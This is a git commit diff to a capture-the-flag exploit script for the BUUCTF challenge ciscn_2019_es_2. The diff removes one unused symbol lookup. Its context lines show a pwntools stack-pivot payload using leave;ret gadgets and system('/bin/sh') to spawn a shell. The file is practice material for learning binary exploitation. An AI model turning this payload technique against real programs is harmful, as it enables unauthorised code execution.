4396f2f2474d4e2bcef5c4030dbf40e58f197739
t0ur1st <tanyaodan@qq.com>
2023-06-18 20:06:34 +0800

    Update ciscn_2019_es_2.py

--- BUUCTF/ciscn_2019_es_2.py
+++ BUUCTF/ciscn_2019_es_2.py
@@ -13,7 +13,6 @@ leave_ret = 0x80485fd  # leave; ret; 这俩个都行
 leave_ret = 0x80484b8  # ROPgadget --binary ./ciscn_2019_es_2 --only "leave|ret"
 elf = ELF('./ciscn_2019_es_2')
 system_addr = elf.symbols['system']  # 0x8048400
-shell_addr = elf.symbols['hack']
 stdin_addr = ebp-0x38
 payload = p32(ebp)
 payload += p32(system_addr) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
